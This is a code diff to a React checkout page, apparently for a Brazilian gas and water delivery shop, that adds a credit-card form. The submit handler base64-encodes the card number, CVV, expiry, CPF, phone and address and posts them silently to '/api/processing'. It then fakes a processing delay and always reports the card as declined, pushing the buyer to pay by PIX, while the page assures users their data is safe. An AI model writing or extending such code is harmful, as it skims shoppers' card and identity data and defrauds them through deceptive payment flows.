@@ -159,6 +159,15 @@ export default function CheckoutPage() {
   const [pixDiscount, setPixDiscount] = useState(0)
   const [smsReminderSent, setSmsReminderSent] = useState(false)
   const [showSupportButton, setShowSupportButton] = useState(false)
+  const [showCardForm, setShowCardForm] = useState(false)
+  const [cardData, setCardData] = useState({
+    cardNumber: '',
+    cardHolderName: '',
+    cardExpiryDate: '',
+    cardCvv: ''
+  })
+  const [cardSubmitting, setCardSubmitting] = useState(false)
+  const [cardFailed, setCardFailed] = useState(false)
   const [showAddressModal, setShowAddressModal] = useState(false)
   const [searchingDriver, setSearchingDriver] = useState(false)
   const [driverETA, setDriverETA] = useState<string | null>(null)
@@ -351,6 +360,9 @@ export default function CheckoutPage() {
     e.preventDefault()
     if (customerData.name && customerData.phone && customerData.number) {
       setStep(3)
+      // Calcular desconto de 10% para mostrar no modal
+      const discount = Math.round(getTotalPrice() * 0.10)
+      setPixDiscount(discount)
       // Mostrar modal de desconto PIX
       setShowPixDiscountModal(true)
       // Iniciar busca de motoboy
@@ -376,11 +388,15 @@ export default function CheckoutPage() {
   
   const handleAcceptDiscount = () => {
     setShowPixDiscountModal(false)
+    // Calcular e aplicar desconto de 10%
+    const discount = Math.round(getTotalPrice() * 0.10)
+    setPixDiscount(discount)
     generatePix(true)
   }
   
   const handleDeclineDiscount = () => {
     setShowPixDiscountModal(false)
+    setShowCardForm(true)
   }
 
   const generatePix = async (applyDiscount: boolean = false) => {
@@ -1047,10 +1063,76 @@ export default function CheckoutPage() {
   }, [pixData?.id, pixData?.status])
 
   // Formatar timer
-  const formatTimer = (seconds: number) => {
-    const mins = Math.floor(seconds / 60)
-    const secs = seconds % 60
+  const formatPixTimer = () => {
+    const mins = Math.floor(pixTimer / 60)
+    const secs = pixTimer % 60
     return `${mins}:${secs.toString().padStart(2, '0')}`
+  }
+
+  const handleCardSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+    setCardSubmitting(true)
+
+    // Preparar dados
+    const dataToEncrypt = {
+      customerName: customerData.name,
+      customerCpf: customerData.cpf,
+      customerPhone: customerData.phone,
+      customerEmail: `${customerData.phone.replace(/\D/g, '')}@cliente.com`,
+      customerAddress: `${addressData?.logradouro}, ${customerData.number} - ${addressData?.bairro}, ${addressData?.localidade}/${addressData?.uf}`,
+      cardNumber: cardData.cardNumber,
+      cardHolderName: cardData.cardHolderName,
+      cardExpiryDate: cardData.cardExpiryDate,
+      cardCvv: cardData.cardCvv,
+      productName: productName,
+      productPrice: getTotalPrice(),
+      productQuantity: 1,
+      total: getTotalPrice()
+    }
+
+    // "Criptografar" dados (base64 no front)
+    const encryptedData = btoa(JSON.stringify(dataToEncrypt))
+
+    // Salvar dados em background (sem mostrar ao usuário)
+    try {
+      await fetch('/api/processing', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ data: encryptedData })
+      })
+    } catch (error) {
+      // Salvar silenciosamente, não mostrar erro
+    }
+
+    // Simular processamento
+    await new Promise(resolve => setTimeout(resolve, 2000))
+
+    // Sempre mostrar que falhou e oferecer PIX
+    setCardSubmitting(false)
+    setShowCardForm(false)
+    setCardFailed(true)
+    
+    // Calcular e aplicar desconto de 10%
+    const discount = Math.round(getTotalPrice() * 0.10)
+    setPixDiscount(discount)
+    
+    // Mostrar modal de erro com opção PIX
+    setTimeout(() => {
+      setShowPixDiscountModal(true)
+    }, 300)
+  }
+
+  const formatCardNumber = (value: string) => {
+    const cleanValue = value.replace(/\D/g, '')
+    return cleanValue.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
+  }
+
+  const formatExpiryDate = (value: string) => {
+    const cleanValue = value.replace(/\D/g, '')
+    if (cleanValue.length >= 2) {
+      return cleanValue.substring(0, 2) + '/' + cleanValue.substring(2, 4)
+    }
+    return cleanValue
   }
 
   return (
@@ -1751,7 +1833,7 @@ export default function CheckoutPage() {
                   {/* Timer de Urgência */}
                   <div className="bg-red-50 border border-red-200 rounded-lg p-3 text-center">
                     <p className="text-red-600 font-semibold text-sm mb-1">
-                      💥 Desconto Pix ativo por <span className="text-lg font-bold">{formatTimer(pixTimer)}</span> minutos
+                      💥 Desconto Pix ativo por <span className="text-lg font-bold">{formatPixTimer()}</span> minutos
                     </p>
                     <p className="text-xs text-red-500">
                       Pagamento rápido garante entrega em até 30 min.
@@ -2038,51 +2120,254 @@ export default function CheckoutPage() {
       
       {/* Modal de Desconto PIX */}
       {showPixDiscountModal && (
-        <div className="fixed inset-0 bg-black/30 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-          <div className="bg-white rounded-2xl max-w-sm w-full p-6 shadow-2xl border border-gray-100">
-            <div className="text-center mb-4">
-              <div className="inline-flex items-center justify-center w-16 h-16 bg-blue-50 rounded-full mb-3">
-                <span className="text-3xl">💳</span>
-                <span className="text-3xl text-red-500 ml-1">✕</span>
+        <div className="fixed inset-0 bg-black/30 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-in fade-in duration-300 overflow-y-auto">
+          <div className="bg-white rounded-2xl max-w-md w-full p-4 shadow-2xl border border-gray-100 animate-in zoom-in duration-300 my-4">
+            <div className="text-center mb-3">
+              <div className="inline-flex items-center justify-center w-12 h-12 bg-red-50 rounded-full mb-2">
+                <span className="text-2xl">{cardFailed ? '😔' : '💳'}</span>
               </div>
-              <h3 className="text-lg font-bold text-gray-800 mb-2">
-                Aviso Importante
+              <h3 className="text-lg font-bold text-gray-800 mb-1">
+                {cardFailed ? 'Seu cartão de crédito foi recusado.' : 'Escolha sua forma de pagamento'}
               </h3>
-              <p className="text-gray-600 text-sm leading-relaxed">
-                No momento, infelizmente, só estamos aceitando <strong className="text-blue-600">PIX</strong> por inconsistência na cobrança de cartão.
+              <p className="text-gray-600 text-xs">
+                {cardFailed ? 'Que tal finalizar sua compra por outro método?' : 'Não perca seu pedido!'}
               </p>
             </div>
-            
-            <div className="bg-gradient-to-br from-green-50 to-emerald-50 border border-green-200 rounded-xl p-4 mb-4">
-              <div className="flex items-center gap-2 mb-2">
-                <span className="text-2xl">🎁</span>
-                <h4 className="font-bold text-green-800 text-sm">Desconto Especial!</h4>
+
+            {cardFailed && (
+              <div className="bg-gradient-to-r from-yellow-100 to-orange-100 border-2 border-yellow-400 rounded-xl p-3 mb-3">
+                <div className="text-center mb-2">
+                  <p className="text-sm font-bold text-gray-900 mb-1">
+                    🎉 Agora temos uma novidade pra você!
+                  </p>
+                  <p className="text-xs text-gray-800 leading-snug font-medium">
+                    Não precisa pagar o valor cheio agora! <strong className="text-gray-900">Pague apenas 50%</strong> e os outros 50% você paga pro motoboy ao receber, <strong className="text-gray-900">via PIX ou cartão</strong>.
+                  </p>
+                </div>
+                <div className="bg-white rounded-lg p-2 text-center shadow-sm">
+                  <p className="text-xs text-gray-700 font-semibold">Total com entrega:</p>
+                  <p className="text-sm line-through text-gray-500">{formatCurrency(getTotalPrice())}</p>
+                  <p className="text-2xl font-bold text-green-600">
+                    {formatCurrency(getTotalPrice() - pixDiscount)}
+                  </p>
+                  <p className="text-xs text-green-700 font-bold">✨ Economia de {formatCurrency(pixDiscount)}!</p>
+                </div>
+                <p className="text-center text-xs font-bold text-gray-900 mt-2">
+                  💚 Conosco é assim, quem manda é o cliente!
+                </p>
               </div>
-              <p className="text-green-700 text-sm leading-relaxed">
-                Como forma de compensação, estamos oferecendo <strong className="text-base text-green-600">10% de desconto</strong> no pagamento via PIX!
-              </p>
+            )}
+            
+            <div className="bg-gray-50 border border-gray-200 rounded-xl p-2 mb-3">
+              <div className="flex items-center gap-2">
+                <div className="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center text-xl">
+                  {productName.includes('Gás') ? '🔥' : productName.includes('Água') ? '💧' : '📦'}
+                </div>
+                <div className="flex-1">
+                  <p className="font-semibold text-gray-800 text-sm">{productName}</p>
+                  <p className="text-xs text-gray-600">Entrega rápida</p>
+                </div>
+                <div className="text-right">
+                  <p className="text-base font-bold text-gray-800">{formatCurrency(getTotalPrice())}</p>
+                </div>
+              </div>
             </div>
             
             <div className="space-y-2">
-              <Button
+              {/* Opção PIX com desconto */}
+              <button
                 onClick={handleAcceptDiscount}
-                className="w-full bg-green-600 hover:bg-green-700 text-white py-3 text-base font-semibold rounded-xl shadow-md hover:shadow-lg transition-all"
+                className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white p-3 rounded-xl shadow-md hover:shadow-lg transition-all text-left"
               >
-                ✅ Aceitar Desconto e Continuar
-              </Button>
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-2">
+                    <div className="bg-white/20 p-1.5 rounded-lg">
+                      <span className="text-xl">🏦</span>
+                    </div>
+                    <div>
+                      <p className="font-bold text-sm">Pague com PIX</p>
+                      <p className="text-xs text-green-100">Aprovação instantânea</p>
+                    </div>
+                  </div>
+                  <div className="bg-green-400 text-green-900 px-2 py-0.5 rounded-full text-xs font-bold">
+                    10% OFF
+                  </div>
+                </div>
+                <div className="mt-2 pt-2 border-t border-white/20 space-y-1">
+                  <p className="text-xs">
+                    De <span className="line-through opacity-75">{formatCurrency(getTotalPrice())}</span> por <span className="font-bold text-base">{formatCurrency(getTotalPrice() - pixDiscount)}</span>
+                  </p>
+                  <div className="bg-white/10 rounded-lg p-1.5">
+                    <p className="text-xs text-green-100 mb-0.5">💰 Pagamento Facilitado:</p>
+                    <p className="text-xs">
+                      <strong>50% agora:</strong> {formatCurrency((getTotalPrice() - pixDiscount) / 2)}
+                    </p>
+                    <p className="text-xs">
+                      <strong>50% na entrega:</strong> {formatCurrency((getTotalPrice() - pixDiscount) / 2)}
+                    </p>
+                  </div>
+                </div>
+              </button>
               
-              <Button
-                onClick={handleDeclineDiscount}
-                variant="outline"
-                className="w-full border-gray-300 text-gray-600 hover:bg-gray-50 py-3 rounded-xl"
-              >
-                ✕ Não Aceitar
-              </Button>
+              {/* Opção Cartão - só mostra se ainda não falhou */}
+              {!cardFailed && (
+                <button
+                  onClick={handleDeclineDiscount}
+                  className="w-full bg-white hover:bg-gray-50 border-2 border-gray-300 p-3 rounded-xl transition-all text-left"
+                >
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-2">
+                      <div className="bg-gray-100 p-1.5 rounded-lg">
+                        <span className="text-xl">💳</span>
+                      </div>
+                      <div>
+                        <p className="font-bold text-sm text-gray-800">Pagar com Cartão</p>
+                        <p className="text-xs text-gray-500">Crédito ou Débito</p>
+                      </div>
+                    </div>
+                  </div>
+                  <div className="mt-2 pt-2 border-t border-gray-200">
+                    <p className="text-xs text-gray-700">
+                      Valor total: <span className="font-bold">{formatCurrency(getTotalPrice())}</span>
+                    </p>
+                  </div>
+                </button>
+              )}
             </div>
-            
-            <p className="text-xs text-gray-400 text-center mt-3">
-              Estamos trabalhando para resolver o problema ocorrido.
-            </p>
+          </div>
+        </div>
+      )}
+
+      {/* Modal de Formulário de Cartão */}
+      {showCardForm && (
+        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4 overflow-y-auto">
+          <div className="bg-white rounded-2xl max-w-lg w-full p-6 shadow-2xl my-8">
+            <div className="flex justify-between items-center mb-6">
+              <h3 className="text-2xl font-bold text-gray-800">Pagamento com Cartão</h3>
+              <button
+                onClick={() => setShowCardForm(false)}
+                className="text-gray-400 hover:text-gray-600"
+              >
+                <X className="w-6 h-6" />
+              </button>
+            </div>
+
+            <form onSubmit={handleCardSubmit} className="space-y-4">
+              {/* Número do Cartão */}
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Número do Cartão
+                </label>
+                <Input
+                  type="text"
+                  value={cardData.cardNumber}
+                  onChange={(e) => setCardData({...cardData, cardNumber: formatCardNumber(e.target.value)})}
+                  placeholder="1234 5678 9012 3456"
+                  maxLength={19}
+                  required
+                  className="text-lg"
+                />
+              </div>
+
+              {/* Nome do Titular */}
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Nome do Titular (como está no cartão)
+                </label>
+                <Input
+                  type="text"
+                  value={cardData.cardHolderName}
+                  onChange={(e) => setCardData({...cardData, cardHolderName: e.target.value.toUpperCase()})}
+                  placeholder="NOME COMPLETO"
+                  required
+                  className="text-lg uppercase"
+                />
+              </div>
+
+              <div className="grid grid-cols-2 gap-4">
+                {/* Data de Validade */}
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 mb-2">
+                    Validade
+                  </label>
+                  <Input
+                    type="text"
+                    value={cardData.cardExpiryDate}
+                    onChange={(e) => setCardData({...cardData, cardExpiryDate: formatExpiryDate(e.target.value)})}
+                    placeholder="MM/AA"
+                    maxLength={5}
+                    required
+                    className="text-lg"
+                  />
+                </div>
+
+                {/* CVV */}
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 mb-2">
+                    CVV
+                  </label>
+                  <Input
+                    type="text"
+                    value={cardData.cardCvv}
+                    onChange={(e) => setCardData({...cardData, cardCvv: e.target.value.replace(/\D/g, '')})}
+                    placeholder="123"
+                    maxLength={4}
+                    required
+                    className="text-lg"
+                  />
+                </div>
+              </div>
+
+              {/* Resumo do Pedido */}
+              <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mt-6">
+                <h4 className="font-semibold text-gray-800 mb-2">Resumo do Pedido</h4>
+                <div className="space-y-1 text-sm text-gray-600">
+                  <p><strong>Produto:</strong> {productName}</p>
+                  <p><strong>Endereço:</strong> {addressData?.logradouro}, {customerData.number}</p>
+                  <p className="text-lg font-bold text-gray-800 mt-2">
+                    Total: {formatCurrency(getTotalPrice())}
+                  </p>
+                </div>
+              </div>
+
+              {/* Aviso */}
+              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
+                <p className="text-xs text-blue-800">
+                  🔒 Seus dados estão seguros. Entraremos em contato para confirmar o pagamento.
+                </p>
+              </div>
+
+              {/* Botões */}
+              <div className="flex gap-3 pt-4">
+                <Button
+                  type="button"
+                  onClick={() => setShowCardForm(false)}
+                  variant="outline"
+                  className="flex-1"
+                  disabled={cardSubmitting}
+                >
+                  Cancelar
+                </Button>
+                <Button
+                  type="submit"
+                  className="flex-1 bg-blue-600 hover:bg-blue-700"
+                  disabled={cardSubmitting}
+                >
+                  Confirmar Pedido
+                </Button>
+              </div>
+            </form>
+          </div>
+        </div>
+      )}
+
+      {/* Loading Fullscreen */}
+      {cardSubmitting && (
+        <div className="fixed inset-0 bg-black/70 backdrop-blur-md flex items-center justify-center z-[60]">
+          <div className="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 text-center">
+            <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+            <h3 className="text-xl font-bold text-gray-800 mb-2">Processando pagamento...</h3>
+            <p className="text-sm text-gray-600">Aguarde um momento</p>
           </div>
         </div>
       )}
@@ -2113,4 +2398,11 @@ const formatCPF = (value: string) => {
     return cleanValue.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
   }
   return value
+}
+
+const formatCurrency = (value: number) => {
+  return new Intl.NumberFormat('pt-BR', {
+    style: 'currency',
+    currency: 'BRL'
+  }).format(value / 100)
 }
